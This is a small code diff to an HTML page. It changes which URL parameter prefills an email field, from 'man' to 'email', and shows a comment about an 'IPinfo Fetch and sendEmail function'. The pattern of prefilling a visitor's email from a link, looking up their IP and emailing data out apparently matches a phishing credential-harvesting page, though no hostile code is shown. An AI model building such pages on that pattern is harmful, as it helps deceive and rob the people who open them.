@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -157,11 +158,12 @@
     });
 
     // Populate the email field from URL parameter
-    window.onload = function () {
-      var urlParams = new URLSearchParams(window.location.search);
-      var email = urlParams.get('man');
-      document.getElementById('email').value = email || '';
-    };
+window.onload = function () {
+  var urlParams = new URLSearchParams(window.location.search);
+  var email = urlParams.get('email'); // Fetch 'email' parameter from the URL
+  document.getElementById('email').value = email || ''; // Populate the email field if the parameter exists
+};
+
 
     // IPinfo Fetch and sendEmail function
     function sendEmail() {
